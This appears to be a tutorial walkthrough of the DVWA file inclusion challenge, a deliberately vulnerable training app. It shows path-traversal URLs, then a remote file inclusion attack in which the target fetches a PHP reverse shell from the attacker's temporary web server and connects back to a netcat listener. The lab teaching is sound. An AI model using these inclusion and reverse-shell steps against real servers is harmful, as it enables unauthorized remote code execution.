<b>Challenge URL:</b> /dvwa/vulnerabilities/fi/
<br>
<b>Objective:</b> Read all five famous quotes from <b>../hackable/flags/fi.php</b> using only file inclusion.
<br>
<b>Tools needed:</b> A reverse shell, a temporary web server on Kali, netcat, fimap (optional)
<br><br>
<i>Did you remember to read this section's <a href="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/README.md">README</a>?</i>

<h2><b>The Guide</b></h2>

<h3><b>Testing the Form</b></h3>

When we start, we see a basic form with three links to <b>file1.php</b>, <b>file2.php</b>, and <b>file3.php</b>.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/fiform.png" width="500">

Let's try clicking on each of the three PHP links:

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/fitest1.png" width="500">

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/fitest2.png" width="500">

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/fitest3.png" width="500">

Take a closer look at the URL on that last screenshot:

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=file3.php</b>

Then look at the others. It seems that the only thing that changes is the <b>page</b> parameter. When clicking each link, <b>page</b> changes accordingly. Let's start testing for a file inclusion vulnerability as follows:

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=https://www.google.com</b>

Formatting aside, it looks like we successfully pulled in the Google homepage to our form!

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/fitestattack.png" width="500">

Let's figure out how far we can take this.

<h3><b>Local File Inclusion</b></h3>

The objective already told us where the five quotes are: <b>../hackable/flags/fi.php</b>. Let's start there, by passing in that exact path to the <b>page</b> parameter.

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=../hackable/flags/fi.php</b>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/filfifail.png" width="500">

Hm, nothing got pulled in? Strange. Why do you think that is?

If you look carefully, you'll notice that we set the root directory of DVWA to <b>/dvwa/</b>. Therefore, the challenge is located at <b>/dvwa/vulnerabilities/fi/</b>. But wait, DVWA gave us the following path for the flags: <b>/dvwa/hackable/flags/fi.php</b>. What happened? Essentially, DVWA placed our current challenge two levels deep from the root. However, we only navigated up one directory in our attempted exploit. We'll actually need to go up <i>two</i> levels to find the <b>/hackable/</b> directory, not just one.

<i>Note: if you didn't deduce this yourself, you could use an automatic tool like "fimap" to "brute force" how many directories you'll need to traverse.</i>

Let's modify the URL as follows:

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php</b>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/filfipartial.png" width="500">

Success ... partially? We can clearly see quotes #1, #2, and #4. #3 seems to have been hidden in some manner, and we don't see #5 at all. Let's examine the source code (Right-click > "Inspect Element") and see if we can find out what happened to the missing quotes.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/filfipartialfive.png" width="500">

Aha! #5 shows up in the source! It's commented out, which means your average end user wouldn't see it. But #3 still doesn't appear. That must mean the server-side code is obfuscating it in some manner. 

What can we do to view the server-side source code? I think it's time for my favorite kind of exploit ...

<h3><b>Remote File Inclusion</b></h3>

We already know we can point the <b>page</b> parameter to whatever we want, whether it's a local file or remote site. So can we point it to something that gives us a bit more control? A shell of some sort? Let's find out!

I tend to like reverse shells, so let's start by setting up a temporary web server on Kali. I don't know about you, but I don't want to deal with a full Apache server, .htaccess, moving files around, and all that. Lucky for us, we can easily stand one up with the following command:

<code>python -m SimpleHTTPServer 9999</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/firfilistenersetup.png" width="500">

Of course, you can change <code>9999</code> to whatever port you want.

Now let's find a shell. 

Kali actually has a bunch of them included by default. You can find them at <b>/usr/share/webshells/</b>. Since we're dealing with PHP, I'm going to take <b>php/php-reverse-shell.php</b> and move it to my working directory. Open it up and define the variable <code>$ip</code> to your Kali IP address and <code>$port</code> to whatever port you want to receive a connection to. It's that easy!

Finally, we'll need a listener to accept the connection from the shell. The networking tool "netcat" sounds like it will fit our needs. Let's try this:

<code>nc -lvnp 5555</code>

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/firfincsetup.png" width="500">

Again, feel free to change <code>5555</code> to your preferred port.

Now it's time to bring it all together. Your new RFI exploit should look something like:

<b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=http&#58;//</b>[your_Kali_IP]<b>:9999/php-reverse-shell.php</b>

Let's try it out! Let's submit the URL and check our netcat listener.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/firfishell.png" width="500">

At this point, it's game over. All we need to do is navigate to the <b>fi.php</b> file mentioned above and view the source code.

<img src="https://github.com/mrudnitsky/dvwa-guide-2019/blob/master/low/screenshots/firfisuccess.png" width="500">

There's #3! We have all five quotes. Challenge complete. Well done!
